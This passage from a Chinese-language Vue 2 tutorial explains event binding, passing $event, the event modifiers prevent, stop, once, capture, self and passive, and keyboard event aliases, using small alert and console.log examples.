&lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>        &lt;button v-on:click&#x3D;&quot;showInfo1&quot;&gt;点击跳转!&lt;&#x2F;button&gt;<br>        &lt;button @click&#x3D;&quot;showInfo2(12)&quot;&gt;点击跳转!!&lt;&#x2F;button&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            name: &#39;张加林&#39;<br>        &#125;,<br>        methods: &#123; &#x2F;&#x2F;配置事件的回调<br>            showInfo1(event) &#123;<br>                console.log(event),<br>                alert(&#39;Mike Taylor1&#39;)<br>            &#125;,<br>            showInfo2(number) &#123;<br>                console.log(number);<br>                alert(&#39;Mike Taylor2&#39;)<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826164519087.png" srcset="/img/loading.gif" lazyload alt="image-20210826164519087"></p>
<p>需要解决的BUG：这样写代码会丢失event，再也不能使用event了。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826165107430.png" srcset="/img/loading.gif" lazyload alt="image-20210826165107430" style="zoom:150%;" />

<p>解决方法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo2(12,$event)&quot;</span>&gt;</span>点击跳转!!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826165312250.png" srcset="/img/loading.gif" lazyload alt="image-20210826165312250" style="zoom: 80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826165235603.png" srcset="/img/loading.gif" lazyload alt="image-20210826165235603"></p>
<p>methods中的方法与Vue实例：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826165550319.png" srcset="/img/loading.gif" lazyload alt="image-20210826165550319" style="zoom:80%;" />

<p>回调方法写在methods中，不要写在data中，因为会自动进行数据代理，添加无意义的getter和setter。（函数只是调用的，不需要更改）</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826170322570.png" srcset="/img/loading.gif" lazyload alt="image-20210826170322570" style="zoom: 80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826170434590.png" srcset="/img/loading.gif" lazyload alt="image-20210826170434590" style="zoom:80%;" />

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>事件的基本使用：</p>
<ul>
<li>使用v-on:xxx  或 @click绑定事件，其中xxx为事件名称</li>
<li>事件的回调需要配置在methods对象中，最终会在vm上</li>
<li>methods中配置的函数，不要使用箭头函数！！！否则this指向的就不再是vm了</li>
<li>methods中配置的函数，都是被Vue所管理的函数，，this指向的是vm或者组件实例对象</li>
<li>@click = “demo” 和 @click = “demo($event)” 效果一致，但是后者可以传参</li>
</ul>
<h3 id="1-12-事件修饰符"><a href="#1-12-事件修饰符" class="headerlink" title="1.12 事件修饰符"></a>1.12 事件修饰符</h3><h4 id="阻止a标签的跳转行为"><a href="#阻止a标签的跳转行为" class="headerlink" title="阻止a标签的跳转行为"></a>阻止a标签的跳转行为</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>        &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click&#x3D;&quot;showInfo&quot;&gt;点击跳转&lt;&#x2F;a&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            name: &#39;张加林&#39;<br>        &#125;,<br>        methods: &#123;<br>            showInfo(event)&#123;<br>                event.preventDefault(); &#x2F;&#x2F;阻止弹窗<br>                alert(&#39;Mike Taylor个人站点&#39;)<br>            &#125;<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure>

<p>vue中的阻止方法：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826172243495.png" srcset="/img/loading.gif" lazyload alt="image-20210826172243495" style="zoom: 67%;" />

<p>prevent即事件修饰符，阻止默认行为。</p>
<h4 id="6个事件修饰符"><a href="#6个事件修饰符" class="headerlink" title="6个事件修饰符"></a>6个事件修饰符</h4><table>
<thead>
<tr>
<th>修饰符名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>prevent</td>
<td>阻止默认事件（常用）</td>
</tr>
<tr>
<td>stop</td>
<td>阻止事件冒泡（常用）</td>
</tr>
<tr>
<td>once</td>
<td>事件只触发一次（常用）</td>
</tr>
<tr>
<td>capture</td>
<td>使用事件的捕获模式</td>
</tr>
<tr>
<td>selt</td>
<td>只有event.target是当前操作的元素才是触发事件</td>
</tr>
<tr>
<td>passive</td>
<td>事件的默认行为立即执行，无需等待事件回调执行完毕</td>
</tr>
</tbody></table>
<h5 id="prevent：略"><a href="#prevent：略" class="headerlink" title="prevent：略"></a>prevent：略</h5><h5 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h5><p>事件冒泡</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/6.gif" srcset="/img/loading.gif" lazyload alt="6" style="zoom:67%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;style&gt;<br>    .demo1&#123;<br>        margin-top:20px;<br>        height: 40px;<br>        background-color: #8080ff;<br>    &#125;<br>&lt;&#x2F;style&gt;<br>&lt;body&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>        &lt;!-- 阻止事件冒泡（常用） --&gt;<br>        &lt;div class&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt;<br>            &lt;button  @click&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt;<br>        &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            name: &#39;张加林&#39;<br>        &#125;,<br>        methods: &#123;<br>            showInfo(event)&#123;<br>                alert(&#39;Mike Taylor个人站点&#39;)<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>阻止事件冒泡</p>
<p>TS</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826173944955.png" srcset="/img/loading.gif" lazyload alt="image-20210826173944955" style="zoom:67%;" />

<p>Vue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div class&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt;<br>            &lt;button  @click.stop&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

<h5 id="once"><a href="#once" class="headerlink" title="once"></a>once</h5><p>效果</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/7.gif" srcset="/img/loading.gif" lazyload alt="7" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;button @click.once&#x3D;&quot;showInfo&quot;&gt;点击提示&lt;&#x2F;button&gt;<br></code></pre></td></tr></table></figure>

<h5 id="capture"><a href="#capture" class="headerlink" title="capture"></a>capture</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>        &lt;!-- 使用事件的捕获模式 --&gt;<br>        &lt;div class&#x3D;&quot;box1&quot; @click&#x3D;&quot;showMsg(1)&quot;&gt;<br>            div1 <br>            &lt;div class&#x3D;&quot;box2&quot; @click&#x3D;&quot;showMsg(2)&quot;&gt;<br>                div2<br>            &lt;&#x2F;div&gt;<br>        &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            name: &#39;张加林&#39;<br>        &#125;,<br>        methods: &#123;<br>            showMsg(number) &#123;<br>                console.log(number);<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br><br></code></pre></td></tr></table></figure>

<p>点击div2区域后触发的效果：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826175500478.png" srcset="/img/loading.gif" lazyload alt="image-20210826175500478" style="zoom:80%;" />

<p>点击div2先经过事件捕获过程，随后才是事件冒泡，默认情况下，冒泡阶段处理事件。</p>
<p>捕获阶段，由外往内；冒泡阶段，由内往外。</p>
<p>对外部盒子使用capture：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826180237994.png" srcset="/img/loading.gif" lazyload alt="image-20210826180237994"></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826180050647.png" srcset="/img/loading.gif" lazyload alt="image-20210826180050647" style="zoom:80%;" />

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs text">    .capture 冒泡顺序<br>    例如 div1中嵌套div2中嵌套div3<br><br>&lt;div id=&quot;app&quot; v-on:click=&quot;show&quot;&gt;<br>            1<br>            &lt;div id=&quot;app2&quot; v-on:click.capture=&quot;show2&quot;&gt;<br>                2<br>                &lt;div id=&quot;app3&quot; v-on:click=&quot;show3&quot;&gt;<br>                    3<br>                    <br>                &lt;/div&gt;<br>            &lt;/div&gt;<br>        &lt;/div&gt;<br><br>        &lt;script type=&quot;text/javascript&quot;&gt;<br>        var vm=new Vue(&#123;<br>            el:&quot;#app&quot;,<br>            data:&#123;<br>                <br>            &#125;,<br>            methods:&#123;<br>                show:function()&#123;<br>                    console.log(&quot;这是app的方法&quot;)<br>                &#125;,<br>                show2:function()&#123;<br>                    console.log(&quot;这是app2的方法&quot;)<br>                &#125;,<br>                show3:function()&#123;<br>                    console.log(&quot;这是app3的方法&quot;)<br>                &#125;<br>            &#125;<br>        &#125;)<br>    &lt;/script&gt;<br> 此处的代码因为div2有capture关键字，所以此时冒泡的顺序发生了改变<br>    正常情况下：<br>        点击div3一层一层冒泡，先div3=》div2=》div1<br><br>    使用了关键字：<br>        点击div3时，先div2=》div3=》div1<br>        1.先冒泡外层带有关键字的事件<br>        2.外层执行结束之后，往里层执行事件<br>        3.最后按照从里向外的事件开始执行<br>        就是说只要存在一个capture关键字，就会影响整个嵌套的执行<br>        例子<br>            div1中嵌套div2中嵌套div3.capture中嵌套div4<br>                此时点击div1<br>                先执行带有capture的div3<br>                然后执行div4<br>                最后按照从里向外的顺序执行<br>                顺序就是   div3=》div4=》div2=》div1<br><br>        其他疑惑<br>            此时嵌套为<br>            div1中嵌套div2.capture中嵌套div3中嵌套div4<br>            那么可以想一下点击最里层的div4会怎么触发呢<br>            <br>            1.触发带有关键字的 div2<br>            2.触发点击的div4<br>            3.最后从里向外执行 <br>            那么顺序为   div2=》div4=》div3=》div1<br></code></pre></td></tr></table></figure>

<h5 id="self"><a href="#self" class="headerlink" title="self"></a>self</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;style&gt;<br>    .demo1&#123;<br>        margin-top:20px;<br>        height: 40px;<br>        background-color: #8080ff;<br>    &#125;<br>&lt;&#x2F;style&gt;<br>&lt;body&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>        &lt;!-- 阻止事件冒泡（常用） --&gt;<br>        &lt;div class&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt;<br>            &lt;button  @click&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt;<br>        &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            name: &#39;张加林&#39;<br>        &#125;,<br>        methods: &#123;<br>            showInfo(event)&#123;<br>                console.log(event.target);<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>点击后的效果：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826185225918.png" srcset="/img/loading.gif" lazyload alt="image-20210826185225918" style="zoom:80%;" />

<p>添加stop事件修饰符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div class&#x3D;&quot;demo1&quot; @click.stop&#x3D;&quot;showInfo&quot;&gt;<br>                &lt;button  @click&#x3D;&quot;showInfo&quot;&gt;点击获取提示信息&lt;&#x2F;button&gt;<br>&lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/8.gif" srcset="/img/loading.gif" lazyload alt="8" style="zoom:80%;" />

<h5 id="passive"><a href="#passive" class="headerlink" title="passive"></a>passive</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs vue">    &lt;style&gt;<br>        .list &#123;<br>            width: 200px;<br>            height: 200px;<br>            background-color: #8080ff;<br>            overflow: auto;<br>        &#125;<br><br>        li &#123;<br>            height: 100px;<br>        &#125;<br>    &lt;&#x2F;style&gt;<br>&lt;&#x2F;head&gt;<br><br>&lt;body&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;h2&gt;&#123;&#123;name&#125;&#125;的个人站点：miketaylorjuly123.cn&lt;&#x2F;h2&gt;<br>        &lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 --&gt;<br>        &lt;ul class&#x3D;&quot;list&quot; @scroll&#x3D;&quot;demo&quot;&gt;<br>            &lt;!--滚动条滚动--&gt;<br>            &lt;li&gt;1&lt;&#x2F;li&gt;<br>            &lt;li&gt;2&lt;&#x2F;li&gt;<br>            &lt;li&gt;3&lt;&#x2F;li&gt;<br>            &lt;li&gt;4&lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>        &lt;ul class&#x3D;&quot;list&quot; @wheel&#x3D;&quot;demo&quot;&gt;<br>            &lt;!-- 滚轮滚动 --&gt;<br>            &lt;li&gt;1&lt;&#x2F;li&gt;<br>            &lt;li&gt;2&lt;&#x2F;li&gt;<br>            &lt;li&gt;3&lt;&#x2F;li&gt;<br>            &lt;li&gt;4&lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            name: &#39;张加林&#39;<br>        &#125;,<br>        methods: &#123;<br>            demo() &#123;<br>                console.log(&#39;@@@&#39;);<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>@scroll（滚轮、侧拉条、上下键触发）</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/9.gif" srcset="/img/loading.gif" lazyload alt="9" style="zoom:80%;" />

<p>@wheel(只有滚轮有效，上下键、侧拉条失效)</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/10.gif" srcset="/img/loading.gif" lazyload alt="10" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210826193534166.png" srcset="/img/loading.gif" lazyload alt="image-20210826193534166" style="zoom:67%;" />

<p>@wheel会延迟滚动，这时候可以使用passive修饰符修饰；而@scroll不需要，因为会立即执行默认行为<strong>。passive在移动端使用较多</strong>。</p>
<h3 id="1-13-键盘事件"><a href="#1-13-键盘事件" class="headerlink" title="1.13 键盘事件"></a>1.13 键盘事件</h3><p>案例：在输入框中输入内容后，按下Enter后，在控制台显示。</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/11.gif" srcset="/img/loading.gif" lazyload alt="11"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;h2&gt;我的个人小站：&#123;&#123;site&#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup&#x3D;&quot;showInfo&quot;&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>  new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      site: &#39;miketaylorjuly123.cn&#39;<br>    &#125;,<br>    methods:&#123;<br>      showInfo(event)&#123;<br>        console.log(event.target.value);<br><br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>问题：没有按Enter，控制台输出input框内容。</p>
<p>代码改进</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210828203017835.png" srcset="/img/loading.gif" lazyload alt="image-20210828203017835" style="zoom:67%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/12.gif" srcset="/img/loading.gif" lazyload alt="12" style="zoom:67%;" />

<p>vue中的处理方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.enter&#x3D;&quot;showInfo&quot;&gt;<br></code></pre></td></tr></table></figure>

<h4 id="Vue常用按键别名"><a href="#Vue常用按键别名" class="headerlink" title="Vue常用按键别名"></a>Vue常用按键别名</h4><table>
<thead>
<tr>
<th>按键名</th>
<th>别名</th>
</tr>
</thead>
<tbody><tr>
<td>回车</td>
<td>enter</td>
</tr>
<tr>
<td>删除</td>
<td>delete（捕获“删除”和“退格”键）</td>
</tr>
<tr>
<td>退出</td>
<td>esc</td>
</tr>
<tr>
<td>空格</td>
<td>space</td>
</tr>
<tr>
<td>换行</td>
<td>tab（特殊，需要配合keydown来使用）</td>
</tr>
<tr>
<td>上</td>
<td>up</td>
</tr>
<tr>
<td>下</td>
<td>down</td>
</tr>
<tr>
<td>左</td>
<td>left</td>
</tr>
<tr>
<td>右</td>
<td>right</td>
</tr>
</tbody></table>
<p>为了方便，原来的首字母大写改成了全部小写，但是首字母大写也能实现功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.Enter&#x3D;&quot;showInfo&quot;&gt;<br></code></pre></td></tr></table></figure>

<h4 id="Vue中没有别名的按键处理"><a href="#Vue中没有别名的按键处理" class="headerlink" title="Vue中没有别名的按键处理"></a>Vue中没有别名的按键处理</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210828205602956.png" srcset="/img/loading.gif" lazyload alt="image-20210828205602956" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/14.gif" srcset="/img/loading.gif" lazyload alt="14" style="zoom: 67%;" />

<p>注意：Vue中未提供别名的按键，可以使用按键原始的key值去绑定，但要注意转换为keabab-case(短横线命名)。</p>
<p>对于CapsLock键：</p>
<p>错误(没有效果)</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.CapsLock=&quot;showInfo&quot;&gt;<br></code></pre></td></tr></table></figure>

<p>正确</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.caps-lock&#x3D;&quot;showInfo&quot;&gt;<br></code></pre></td></tr></table></figure>

<p>注意：不是所有键位都可以绑定事件。</p>
<h4 id="特殊系统修饰键"><a href="#特殊系统修饰键" class="headerlink" title="特殊系统修饰键"></a>特殊系统修饰键</h4><p>ctrl、alt、shift、meta(Win键-Windows / Command键-Mac)</p>
<ul>
<li>配合keyup使用：<strong>按下修饰键的同时，再按下其他键，随后释放其他键</strong>，事件才被触发(也可以正常工作，只是一般不用)</li>
<li>配合keydown使用：正常事件触发</li>
</ul>
<p>例如：tab键，本身功能是把焦点从当前元素上切走。而且是跟keyup事件绑定，按下tab键之后，就失去了焦点，事件无法触发，<strong>所以需要使用keydown实现</strong>。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/13.gif" srcset="/img/loading.gif" lazyload alt="13" style="zoom:67%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keydown.tab&#x3D;&quot;showInfo&quot;&gt;<br></code></pre></td></tr></table></figure>

<p>效果：先触发控制台输出，再触发焦点切换功能。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/15.gif" srcset="/img/loading.gif" lazyload alt="15" style="zoom: 67%;" />

<h4 id="使用KeyCode指定具体的按键（不推荐）"><a href="#使用KeyCode指定具体的按键（不推荐）" class="headerlink" title="使用KeyCode指定具体的按键（不推荐）"></a>使用KeyCode指定具体的按键（不推荐）</h4><p>例如Enter，键码为13。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.13&#x3D;&quot;showInfo&quot;&gt;<br></code></pre></td></tr></table></figure>

